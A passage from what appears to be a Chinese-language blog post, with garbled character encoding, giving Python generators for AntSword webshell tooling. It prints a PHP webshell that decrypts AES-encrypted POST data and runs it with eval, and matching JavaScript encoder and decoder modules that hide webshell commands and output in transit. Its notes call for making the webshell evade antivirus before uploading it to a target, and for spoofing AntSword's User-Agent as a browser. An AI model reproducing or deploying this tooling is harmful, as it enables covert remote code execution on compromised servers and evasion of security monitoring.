&#x27;sha256&#x27;);</span></span><br><span class="line"><span class="string">    const iv = crypto.randomBytes(16);</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    const randomID = &quot;<span class="subst">&#123;random_id&#125;</span>&quot;;</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    // åŠ å¯†åŸå§‹payload</span></span><br><span class="line"><span class="string">    const originalPayload = data[&#x27;_&#x27;];</span></span><br><span class="line"><span class="string">    const cipherPayload = crypto.createCipheriv(algorithm, key, iv);</span></span><br><span class="line"><span class="string">    let encryptedPayload = cipherPayload.update(originalPayload, &#x27;utf8&#x27;, &#x27;base64&#x27;);</span></span><br><span class="line"><span class="string">    encryptedPayload += cipherPayload.final(&#x27;base64&#x27;);</span></span><br><span class="line"><span class="string">    data[randomID] = `$&#123;&#123;encryptedPayload&#125;&#125;|$&#123;&#123;iv.toString(&#x27;base64&#x27;)&#125;&#125;`;</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    // åç«¯æ‰§è¡Œä»£ç </span></span><br><span class="line"><span class="string">    const execCode = `</span></span><br><span class="line"><span class="string">        $data = explode(&#x27;|&#x27;, $_POST[&#x27;<span class="subst">&#123;random_id&#125;</span>&#x27;]);</span></span><br><span class="line"><span class="string">        $encrypted = base64_decode($data[0]);</span></span><br><span class="line"><span class="string">        $iv = base64_decode($data[1]);</span></span><br><span class="line"><span class="string">        $salt = hex2bin(&#x27;<span class="subst">&#123;salt_hex&#125;</span>&#x27;);</span></span><br><span class="line"><span class="string">        $key = hash_pbkdf2(</span></span><br><span class="line"><span class="string">            &#x27;sha256&#x27;, </span></span><br><span class="line"><span class="string">            &#x27;<span class="subst">&#123;args.pwd&#125;</span>&#x27;, </span></span><br><span class="line"><span class="string">            $salt, </span></span><br><span class="line"><span class="string">            100000, </span></span><br><span class="line"><span class="string">            <span class="subst">&#123;key_byte_length&#125;</span>, </span></span><br><span class="line"><span class="string">            true</span></span><br><span class="line"><span class="string">        );</span></span><br><span class="line"><span class="string">        $decrypted = openssl_decrypt(</span></span><br><span class="line"><span class="string">            $encrypted, </span></span><br><span class="line"><span class="string">            &#x27;<span class="subst">&#123;args.algorithm&#125;</span>&#x27;, </span></span><br><span class="line"><span class="string">            $key, </span></span><br><span class="line"><span class="string">            OPENSSL_RAW_DATA, </span></span><br><span class="line"><span class="string">            $iv</span></span><br><span class="line"><span class="string">        );</span></span><br><span class="line"><span class="string">        eval($decrypted);</span></span><br><span class="line"><span class="string">    `.replace(/\s+/g, &#x27; &#x27;).trim();</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    // åŠ å¯†æ‰§è¡Œä»£ç </span></span><br><span class="line"><span class="string">    const cipherPwd = crypto.createCipheriv(algorithm, key, iv);</span></span><br><span class="line"><span class="string">    let encryptedPwd = cipherPwd.update(execCode, &#x27;utf8&#x27;, &#x27;base64&#x27;);</span></span><br><span class="line"><span class="string">    encryptedPwd += cipherPwd.final(&#x27;base64&#x27;);</span></span><br><span class="line"><span class="string">    data[pwd] = `$&#123;&#123;encryptedPwd&#125;&#125;|$&#123;&#123;iv.toString(&#x27;base64&#x27;)&#125;&#125;`;</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    delete data[&#x27;_&#x27;];</span></span><br><span class="line"><span class="string">    return data;</span></span><br><span class="line"><span class="string">&#125;&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># åç«¯PHPè„šæœ¬</span></span><br><span class="line">    backend_content = <span class="string">f&#x27;&#x27;&#x27;&lt;?php</span></span><br><span class="line"><span class="string">/**</span></span><br><span class="line"><span class="string"> * åç«¯AESè§£å¯†è„šæœ¬ï¼ˆä¿®å¤å¯†é’¥é•¿åº¦ï¼‰</span></span><br><span class="line"><span class="string"> * å¯†ç ï¼š<span class="subst">&#123;args.pwd&#125;</span> | ç®—æ³•ï¼š<span class="subst">&#123;args.algorithm&#125;</span></span></span><br><span class="line"><span class="string"> */</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$encryptedData = $_POST[&#x27;<span class="subst">&#123;args.pwd&#125;</span>&#x27;] ?? &#x27;&#x27;;</span></span><br><span class="line"><span class="string">if (empty($encryptedData)) &#123;&#123;</span></span><br><span class="line"><span class="string">    exit(&#x27;Missing parameter: <span class="subst">&#123;args.pwd&#125;</span>&#x27;);</span></span><br><span class="line"><span class="string">&#125;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">list($encryptedPwd64, $ivB64) = explode(&#x27;|&#x27;, $encryptedData, 2);</span></span><br><span class="line"><span class="string">if (empty($encryptedPwd64) || empty($ivB64)) &#123;&#123;</span></span><br><span class="line"><span class="string">    exit(&quot;Parameter&#x27;s format is failed!&quot;);</span></span><br><span class="line"><span class="string">&#125;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$encryptedPwd = base64_decode($encryptedPwd64);</span></span><br><span class="line"><span class="string">$iv = base64_decode($ivB64);</span></span><br><span class="line"><span class="string">$salt = hex2bin(&#x27;<span class="subst">&#123;salt_hex&#125;</span>&#x27;);</span></span><br><span class="line"><span class="string">$key = hash_pbkdf2(</span></span><br><span class="line"><span class="string">    &#x27;sha256&#x27;, </span></span><br><span class="line"><span class="string">    &#x27;<span class="subst">&#123;args.pwd&#125;</span>&#x27;, </span></span><br><span class="line"><span class="string">    $salt, </span></span><br><span class="line"><span class="string">    100000, </span></span><br><span class="line"><span class="string">    <span class="subst">&#123;key_byte_length&#125;</span>, </span></span><br><span class="line"><span class="string">    true</span></span><br><span class="line"><span class="string">);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$decryptedCode = openssl_decrypt(</span></span><br><span class="line"><span class="string">    $encryptedPwd,</span></span><br><span class="line"><span class="string">    &#x27;<span class="subst">&#123;args.algorithm&#125;</span>&#x27;,</span></span><br><span class="line"><span class="string">    $key,</span></span><br><span class="line"><span class="string">    OPENSSL_RAW_DATA,</span></span><br><span class="line"><span class="string">    $iv</span></span><br><span class="line"><span class="string">);</span></span><br><span class="line"><span class="string">if ($decryptedCode === false) &#123;&#123;</span></span><br><span class="line"><span class="string">    exit(&#x27;Decription is failed!&#x27;);</span></span><br><span class="line"><span class="string">&#125;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">eval($decryptedCode);</span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">    </span><br><span class="line">    os.makedirs(args.output_dir, exist_ok=<span class="literal">True</span>)</span><br><span class="line">    frontend_path = os.path.join(args.output_dir, <span class="string">&#x27;frontend_encrypt.js&#x27;</span>)</span><br><span class="line">    backend_path = os.path.join(args.output_dir, <span class="string">&#x27;backend_decrypt.php&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(frontend_path, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(frontend_content)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(backend_path, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(backend_content)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;âœ… è„šæœ¬ç”ŸæˆæˆåŠŸï¼&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;å‰ç«¯è„šæœ¬ï¼š<span class="subst">&#123;frontend_path&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;åç«¯è„šæœ¬ï¼š<span class="subst">&#123;backend_path&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;ç®—æ³•ï¼š<span class="subst">&#123;args.algorithm&#125;</span>ï¼ˆå¯†é’¥é•¿åº¦æ­£ç¡®ï¼‰&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&#x27;AESè„šæœ¬ç”Ÿæˆå™¨ï¼ˆä¿®å¤å¯†é’¥é•¿åº¦é—®é¢˜ï¼‰&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--pwd&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&#x27;åŒæ­¥å¯†ç ï¼ˆå¦‚anonymousï¼‰&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--output-dir&#x27;</span>, default=<span class="string">&#x27;./generated_scripts&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;è¾“å‡ºç›®å½•&#x27;</span>)</span><br><span class="line">    parser.add_argument(</span><br><span class="line">        <span class="string">&#x27;--algorithm&#x27;</span>, </span><br><span class="line">        default=<span class="string">&#x27;aes-256-cbc&#x27;</span>, </span><br><span class="line">        choices=[<span class="string">&#x27;aes-128-cbc&#x27;</span>, <span class="string">&#x27;aes-192-cbc&#x27;</span>, <span class="string">&#x27;aes-256-cbc&#x27;</span>],</span><br><span class="line">        <span class="built_in">help</span>=<span class="string">&#x27;AESç®—æ³•ï¼ˆé»˜è®¤aes-256-cbcï¼‰&#x27;</span></span><br><span class="line">    )</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    generate_scripts(args)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

 <figure class="highlight text"><table><tr><td class="code"><pre><span class="line">frontend_encrypt.js: èšå‰‘çš„ç¼–ç å™¨ï¼Œç”¨äºåŠ å¯†èšå‰‘æµé‡ä¸­çš„å‚æ•°ï¼Œæ–°å¢åˆ°èšå‰‘çš„ç¼–ç å™¨ä¸­ï¼Œåˆ›å»ºç›®æ ‡æ—¶é€‰æ‹©è¿™ä¸ª</span><br><span class="line">backend_decrypt.php: webshellï¼Œæ¥æ”¶ã€è§£å¯†ã€æ‰§è¡Œèšå‰‘çš„æŒ‡ä»¤ï¼Œä¸å…æ€ï¼Œåšå…æ€åä¸Šä¼ åˆ°é¶æ ‡ä¸­</span><br></pre></td></tr></table></figure>

 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Tuple</span>, <span class="type">Dict</span>, <span class="type">Optional</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_algorithm_info</span>(<span class="params">algorithm: <span class="built_in">str</span></span>) -&gt; <span class="type">Tuple</span>[<span class="built_in">int</span>, <span class="built_in">int</span>]:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;è·å–ç®—æ³•å¯¹åº”çš„é»˜è®¤å¯†é’¥é•¿åº¦å’Œå‘é‡é•¿åº¦&quot;&quot;&quot;</span></span><br><span class="line">    algo_info = &#123;</span><br><span class="line">        <span class="comment"># ç®—æ³•: (å¯†é’¥é•¿åº¦å­—èŠ‚, å‘é‡é•¿åº¦å­—èŠ‚)</span></span><br><span class="line">        <span class="string">&quot;aes-128-cbc&quot;</span>: (<span class="number">16</span>, <span class="number">16</span>),</span><br><span class="line">        <span class="string">&quot;aes-192-cbc&quot;</span>: (<span class="number">24</span>, <span class="number">16</span>),</span><br><span class="line">        <span class="string">&quot;aes-256-cbc&quot;</span>: (<span class="number">32</span>, <span class="number">16</span>),</span><br><span class="line">        <span class="string">&quot;aes-128-gcm&quot;</span>: (<span class="number">16</span>, <span class="number">12</span>),</span><br><span class="line">        <span class="string">&quot;aes-192-gcm&quot;</span>: (<span class="number">24</span>, <span class="number">12</span>),</span><br><span class="line">        <span class="string">&quot;aes-256-gcm&quot;</span>: (<span class="number">32</span>, <span class="number">12</span>),</span><br><span class="line">        <span class="string">&quot;des-ede3-cbc&quot;</span>: (<span class="number">24</span>, <span class="number">8</span>),  <span class="comment"># 3DES</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> algorithm <span class="keyword">not</span> <span class="keyword">in</span> algo_info:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">f&quot;ä¸æ”¯æŒçš„ç®—æ³•: <span class="subst">&#123;algorithm&#125;</span>ï¼Œæ”¯æŒçš„ç®—æ³•: <span class="subst">&#123;<span class="built_in">list</span>(algo_info.keys())&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> algo_info[algorithm]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_random_key</span>(<span class="params">length: <span class="built_in">int</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;ç”ŸæˆæŒ‡å®šé•¿åº¦çš„éšæœºå¯†é’¥ï¼ˆåŒ…å«ç‰¹æ®Šå­—ç¬¦ï¼‰&quot;&quot;&quot;</span></span><br><span class="line">    chars = string.ascii_letters + string.digits + <span class="string">&#x27;!@#$%^&amp;*()_+-=[]&#123;&#125;|;:,.&lt;&gt;?`~&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(random.choice(chars) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(length))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_encryption_script</span>(<span class="params"></span></span><br><span class="line"><span class="params">    algorithm: <span class="built_in">str</span>,</span></span><br><span class="line"><span class="params">    key: <span class="type">Optional</span>[<span class="built_in">str</span>],</span></span><br><span class="line"><span class="params">    iv: <span class="type">Optional</span>[<span class="built_in">str</span>],</span></span><br><span class="line"><span class="params">    key_length: <span class="type">Optional</span>[<span class="built_in">int</span>],</span></span><br><span class="line"><span class="params">    iv_length: <span class="type">Optional</span>[<span class="built_in">int</span>],</span></span><br><span class="line"><span class="params">    encode_final: <span class="built_in">str</span>,</span></span><br><span class="line"><span class="params">    output_file: <span class="built_in">str</span></span></span><br><span class="line"><span class="params"></span>) -&gt; <span class="type">Dict</span>[<span class="built_in">str</span>, <span class="built_in">str</span>]:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;ç”ŸæˆåŠ å¯†è§£å¯†è„šæœ¬&quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># è·å–ç®—æ³•é»˜è®¤å‚æ•°</span></span><br><span class="line">    default_key_len, default_iv_len = get_algorithm_info(algorithm)</span><br><span class="line">    key_length = key_length <span class="keyword">or</span> default_key_len</span><br><span class="line">    iv_length = iv_length <span class="keyword">or</span> default_iv_len</span><br><span class="line"></span><br><span class="line">    <span class="comment"># å¤„ç†å¯†é’¥</span></span><br><span class="line">    <span class="keyword">if</span> key:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(key) != key_length:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">f&quot;å¯†é’¥é•¿åº¦å¿…é¡»ä¸º <span class="subst">&#123;key_length&#125;</span> å­—èŠ‚ï¼Œå½“å‰ä¸º <span class="subst">&#123;<span class="built_in">len</span>(key)&#125;</span> å­—èŠ‚&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        key = generate_random_key(key_length)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># å¤„ç†å‘é‡</span></span><br><span class="line">    <span class="keyword">if</span> iv:</span><br><span class="line">        <span class="comment"># å‘é‡ä»¥åå…­è¿›åˆ¶å­—ç¬¦ä¸²ä¼ å…¥ï¼Œéœ€éªŒè¯åŸå§‹å­—èŠ‚é•¿åº¦</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(iv) != iv_length * <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">f&quot;å‘é‡åå…­è¿›åˆ¶å­—ç¬¦ä¸²é•¿åº¦å¿…é¡»ä¸º <span class="subst">&#123;iv_length*<span class="number">2</span>&#125;</span>ï¼Œå½“å‰ä¸º <span class="subst">&#123;<span class="built_in">len</span>(iv)&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># ç”Ÿæˆéšæœºå‘é‡ï¼ˆåå…­è¿›åˆ¶å­—ç¬¦ä¸²ï¼‰</span></span><br><span class="line">        iv = os.urandom(iv_length).<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ç”ŸæˆPHPåŠ å¯†å‡½æ•°ï¼ˆå¤„ç†æ¢è¡Œå’Œç©ºæ ¼ï¼‰</span></span><br><span class="line">    php_encrypt = <span class="string">f&quot;&quot;&quot;function asenc($out) &#123;&#123;</span></span><br><span class="line"><span class="string">        $key = &#x27;<span class="subst">&#123;key&#125;</span>&#x27;;</span></span><br><span class="line"><span class="string">        $iv = hex2bin(&#x27;<span class="subst">&#123;iv&#125;</span>&#x27;);</span></span><br><span class="line"><span class="string">        $blockSize = openssl_cipher_iv_length(&#x27;<span class="subst">&#123;algorithm&#125;</span>&#x27;);</span></span><br><span class="line"><span class="string">        $pad = $blockSize - (strlen($out) % $blockSize);</span></span><br><span class="line"><span class="string">        $out .= str_repeat(chr($pad), $pad);</span></span><br><span class="line"><span class="string">        $encrypted = openssl_encrypt($out, &#x27;<span class="subst">&#123;algorithm&#125;</span>&#x27;, $key, OPENSSL_RAW_DATA, $iv);</span></span><br><span class="line"><span class="string">        return <span class="subst">&#123;encode_final&#125;</span>_encode($encrypted);</span></span><br><span class="line"><span class="string">    &#125;&#125;&quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># æ‰‹åŠ¨å¤„ç†PHPå‡½æ•°çš„ç©ºæ ¼å’Œæ¢è¡Œï¼ˆé¿å…ä½¿ç”¨æ­£åˆ™åœ¨f-stringä¸­å†²çªï¼‰</span></span><br><span class="line">    php_encrypt_clean = <span class="string">&#x27; &#x27;</span>.join(php_encrypt.split())</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ç”ŸæˆJavaScriptè„šæœ¬ï¼ˆä½¿ç”¨å¸¸è§„å­—ç¬¦ä¸²æ‹¼æ¥é¿å…f-stringå†²çªï¼‰</span></span><br><span class="line">    js_script = <span class="string">&#x27;&#x27;&#x27;&#x27;use strict&#x27;;</span></span><br><span class="line"><span class="string">const crypto = require(&#x27;crypto&#x27;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// åŠ å¯†é…ç½®: &#123;algorithm&#125; | å¯†é’¥é•¿åº¦: &#123;key_length&#125;å­—èŠ‚ | å‘é‡é•¿åº¦: &#123;iv_length&#125;å­—èŠ‚</span></span><br><span class="line"><span class="string">const ENCRYPTION_KEY = &#x27;&#123;key&#125;&#x27;;</span></span><br><span class="line"><span class="string">const IV = Buffer.from(&#x27;&#123;iv&#125;&#x27;, &#x27;hex&#x27;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">module.exports = &#123;&#123;</span></span><br><span class="line"><span class="string">    asoutput: () =&gt; &quot;&#123;php_encrypt_clean&#125;&quot;&quot;,</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    decode_buff: (buff) =&gt; &#123;&#123;</span></span><br><span class="line"><span class="string">        const encrypted = Buffer.from(buff.toString(), &#x27;&#123;encode_final&#125;&#x27;);</span></span><br><span class="line"><span class="string">        const decipher = crypto.createDecipheriv(&#x27;&#123;algorithm&#125;&#x27;, ENCRYPTION_KEY, IV);</span></span><br><span class="line"><span class="string">        let decrypted = Buffer.concat([decipher.update(encrypted), decipher.final()]);</span></span><br><span class="line"><span class="string">        // å»é™¤PKCS7å¡«å……</span></span><br><span class="line"><span class="string">        const pad = decrypted[decrypted.length - 1];</span></span><br><span class="line"><span class="string">        return decrypted.slice(0, decrypted.length - pad);</span></span><br><span class="line"><span class="string">    &#125;&#125;</span></span><br><span class="line"><span class="string">&#125;&#125;;&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(</span><br><span class="line">        algorithm=algorithm,</span><br><span class="line">        key_length=key_length,</span><br><span class="line">        iv_length=iv_length,</span><br><span class="line">        key=key,</span><br><span class="line">        iv=iv,</span><br><span class="line">        php_encrypt_clean=php_encrypt_clean,</span><br><span class="line">        encode_final=encode_final</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ä¿å­˜åˆ°æ–‡ä»¶</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(output_file, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(js_script)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        <span class="string">&quot;script_path&quot;</span>: output_file,</span><br><span class="line">        <span class="string">&quot;algorithm&quot;</span>: algorithm,</span><br><span class="line">        <span class="string">&quot;key&quot;</span>: key,</span><br><span class="line">        <span class="string">&quot;iv&quot;</span>: iv,</span><br><span class="line">        <span class="string">&quot;key_length&quot;</span>: <span class="built_in">str</span>(key_length),</span><br><span class="line">        <span class="string">&quot;iv_length&quot;</span>: <span class="built_in">str</span>(iv_length),</span><br><span class="line">        <span class="string">&quot;encode&quot;</span>: encode_final</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&quot;åŠ å¯†è„šæœ¬ç”Ÿæˆå™¨ - ç”¨äºç”ŸæˆPHPåŠ å¯†å’ŒJSè§£å¯†çš„é…å¥—è„šæœ¬&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-a&quot;</span>, <span class="string">&quot;--algorithm&quot;</span>, </span><br><span class="line">                      default=<span class="string">&quot;aes-256-cbc&quot;</span>, </span><br><span class="line">                      <span class="built_in">help</span>=<span class="string">f&quot;åŠ å¯†ç®—æ³•ï¼Œæ”¯æŒ: aes-128-cbc, aes-192-cbc, aes-256-cbc, aes-128-gcm, aes-192-gcm, aes-256-gcm, des-ede3-cbc (é»˜è®¤: aes-256-cbc)&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-k&quot;</span>, <span class="string">&quot;--key&quot;</span>, </span><br><span class="line">                      <span class="built_in">help</span>=<span class="string">&quot;è‡ªå®šä¹‰å¯†é’¥ï¼ˆä¸æŒ‡å®šåˆ™è‡ªåŠ¨ç”Ÿæˆï¼‰&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-i&quot;</span>, <span class="string">&quot;--iv&quot;</span>, </span><br><span class="line">                      <span class="built_in">help</span>=<span class="string">&quot;è‡ªå®šä¹‰å‘é‡ï¼ˆåå…­è¿›åˆ¶å­—ç¬¦ä¸²ï¼Œä¸æŒ‡å®šåˆ™è‡ªåŠ¨ç”Ÿæˆï¼‰&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-kl&quot;</span>, <span class="string">&quot;--key-length&quot;</span>, </span><br><span class="line">                      <span class="built_in">type</span>=<span class="built_in">int</span>, </span><br><span class="line">                      <span class="built_in">help</span>=<span class="string">&quot;å¯†é’¥é•¿åº¦ï¼ˆå­—èŠ‚ï¼Œä¸æŒ‡å®šåˆ™æ ¹æ®ç®—æ³•è‡ªåŠ¨æ¨æ–­ï¼‰&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-il&quot;</span>, <span class="string">&quot;--iv-length&quot;</span>, </span><br><span class="line">                      <span class="built_in">type</span>=<span class="built_in">int</span>, </span><br><span class="line">                      <span class="built_in">help</span>=<span class="string">&quot;å‘é‡é•¿åº¦ï¼ˆå­—èŠ‚ï¼Œä¸æŒ‡å®šåˆ™æ ¹æ®ç®—æ³•è‡ªåŠ¨æ¨æ–­ï¼‰&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-e&quot;</span>, <span class="string">&quot;--encode&quot;</span>, </span><br><span class="line">                      default=<span class="string">&quot;base64&quot;</span>, </span><br><span class="line">                      choices=[<span class="string">&quot;base64&quot;</span>, <span class="string">&quot;hex&quot;</span>], </span><br><span class="line">                      <span class="built_in">help</span>=<span class="string">&quot;æœ€ç»ˆç¼–ç æ–¹å¼ï¼ˆbase64/hexï¼Œé»˜è®¤: base64ï¼‰&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;-o&quot;</span>, <span class="string">&quot;--output&quot;</span>, </span><br><span class="line">                      default=<span class="string">&quot;encryption.js&quot;</span>, </span><br><span class="line">                      <span class="built_in">help</span>=<span class="string">&quot;è¾“å‡ºè„šæœ¬æ–‡ä»¶åï¼ˆé»˜è®¤: encryption.jsï¼‰&quot;</span>)</span><br><span class="line"></span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result = generate_encryption_script(</span><br><span class="line">            algorithm=args.algorithm,</span><br><span class="line">            key=args.key,</span><br><span class="line">            iv=args.iv,</span><br><span class="line">            key_length=args.key_length,</span><br><span class="line">            iv_length=args.iv_length,</span><br><span class="line">            encode_final=args.encode,</span><br><span class="line">            output_file=args.output</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span> + <span class="string">&quot;=&quot;</span>*<span class="number">50</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;åŠ å¯†è„šæœ¬ç”ŸæˆæˆåŠŸï¼&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">50</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;è„šæœ¬è·¯å¾„: <span class="subst">&#123;result[<span class="string">&#x27;script_path&#x27;</span>]&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;åŠ å¯†ç®—æ³•: <span class="subst">&#123;result[<span class="string">&#x27;algorithm&#x27;</span>]&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;å¯†é’¥: <span class="subst">&#123;result[<span class="string">&#x27;key&#x27;</span>]&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;å‘é‡(hex): <span class="subst">&#123;result[<span class="string">&#x27;iv&#x27;</span>]&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;å¯†é’¥é•¿åº¦: <span class="subst">&#123;result[<span class="string">&#x27;key_length&#x27;</span>]&#125;</span>å­—èŠ‚&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;å‘é‡é•¿åº¦: <span class="subst">&#123;result[<span class="string">&#x27;iv_length&#x27;</span>]&#125;</span>å­—èŠ‚&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;æœ€ç»ˆç¼–ç : <span class="subst">&#123;result[<span class="string">&#x27;encode&#x27;</span>]&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">50</span> + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;æ³¨æ„ï¼šè¯·å¦¥å–„ä¿å­˜å¯†é’¥å’Œå‘é‡ï¼ŒæœåŠ¡ç«¯éœ€ä½¿ç”¨ç›¸åŒé…ç½®è§£å¯†ï¼&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;ç”Ÿæˆå¤±è´¥: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>, file=sys.stderr)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

 <figure class="highlight text"><table><tr><td class="code"><pre><span class="line">encryption.js: å¯¹å‘½ä»¤ç»“æœè¿›è¡ŒåŠ å¯†è¿›è¡Œä¼ è¾“ï¼Œå®¢æˆ·ç«¯æ‹¿åˆ°ä¹‹åè¿›è¡Œè§£å¯†ã€‚åœ¨AntSwordä¸Šæ–°å¢è§£ç å™¨ï¼Œå†…å®¹å¤åˆ¶è¿›å»ã€‚</span><br></pre></td></tr></table></figure>

 <figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">######################### User-Agent #########################</span><br><span class="line">antSword-2.1.15/modules/update.js: å°†&quot;User-Agent: antSword/v2.0&quot;æ”¹ä¸ºMozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36 Edg/141.0.0.0</span><br></pre></td></tr></table></figure>
</li>
<li><p>ä»£ç å…æ€</p>
